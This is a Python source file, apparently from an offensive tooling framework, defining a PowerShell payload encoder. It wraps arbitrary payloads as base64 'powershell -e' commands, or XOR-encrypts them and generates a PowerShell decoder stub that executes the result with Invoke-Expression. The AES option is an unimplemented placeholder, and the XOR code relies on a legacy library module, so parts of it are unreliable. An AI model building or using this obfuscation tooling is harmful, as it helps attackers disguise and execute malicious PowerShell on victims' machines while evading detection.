import base64
from Crypto.Cipher import XOR
from .base_encoder import BaseEncoder

class PSEncoder(BaseEncoder):
    """PowerShell specific encoder"""
    
    def encode(self, payload: str, method: str) -> str:
        if method == "base64":
            return self._base64_encode(payload)
        elif method == "xor":
            return self._xor_encode(payload)
        elif method == "aes":
            return self._aes_encode(payload)
        else:
            return payload
    
    def _base64_encode(self, payload: str) -> str:
        """Encode payload as Base64 for PowerShell"""
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"powershell -e {encoded}"
    
    def _xor_encode(self, payload: str, key: str = '0xD4') -> str:
        """XOR encode payload for PowerShell"""
        cipher = XOR.new(key.encode())
        encrypted = cipher.encrypt(payload.encode())
        hex_encoded = encrypted.hex()
        
        decode_stub = f"""
$key = [System.Text.Encoding]::UTF8.GetBytes('{key}')
$enc = [System.Convert]::FromHexString('{hex_encoded}')
$decrypted = for ($i = 0; $i -lt $enc.Length; $i++) {{
    $enc[$i] -bxor $key[$i % $key.Length]
}}
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decrypted))
"""
        return decode_stub
    
    def _aes_encode(self, payload: str) -> str:
        """AES encode payload (placeholder)"""
        # TODO: Implement AES encryption
        return payload